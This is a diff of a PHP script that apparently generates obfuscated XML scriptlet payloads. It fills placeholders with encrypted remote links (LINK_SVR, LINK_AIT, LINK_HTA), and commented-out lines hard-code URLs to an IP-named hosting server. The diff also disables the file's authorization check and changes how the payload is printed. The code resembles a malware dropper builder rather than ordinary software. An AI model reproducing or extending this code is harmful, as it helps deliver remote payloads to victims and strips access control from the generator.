@@ -1,6 +1,6 @@
 <?php
 $path = dirname(__DIR__, 2);
-require_once($path . '/src/utils/autorizacao.php'); //TODA AUTORIZAÇÃO DEVE SER FEITA AQUI, PARA QUE O ARQUIVO SEJA EXECUTADO SOMENTE SE AUTORIZADO
+//require_once($path . '/src/utils/autorizacao.php'); //TODA AUTORIZAÇÃO DEVE SER FEITA AQUI, PARA QUE O ARQUIVO SEJA EXECUTADO SOMENTE SE AUTORIZADO
 header('Content-Type: text/plain;');
 $wid = 95;
 $projectRoot = dirname(__DIR__, 2);
@@ -48,7 +48,7 @@ for ($i = 0; $i < $length; $i++) { $randomString .=$characters[rand(0, $characte
     $codex=str_replace("%const1%", cryptw("3"), $codex ); 
 
     //$codex=str_replace("%const2%", cryptw("https://80.32.109.208.host.secureserver.net/fg4gasga"), $codex ); 
-    $codex=str_replace("%const2%", cryptw(getenv('LINK_SVR')), $codex ); 
+    $codex=str_replace("%const2%",getenv('LINK_SVR'), $codex ); 
     //$codex=str_replace("%const3%", cryptw("https://80.32.109.208.host.secureserver.net/v/fg4gasg"), $codex ); 
     $codex=str_replace("%const3%", cryptw(getenv('LINK_AIT')), $codex ); 
     $codex=str_replace("%const4%", cryptw(getenv('LINK_HTA')), $codex );
@@ -143,6 +143,7 @@ for ($i = 0; $i < $length; $i++) { $randomString .=$characters[rand(0, $characte
 //  } else {
 //      header("HTTP/1.0 404 Not Found");
 //  }
+echo $codex; exit;
 $codex = '<?xml version="1.0" encoding="utf-8" ?>
 <component id="component2">
 
@@ -153,4 +154,3 @@ $codex = '<?xml version="1.0" encoding="utf-8" ?>
     ]]>
     </script>
 </component>';
-echo $codex; 
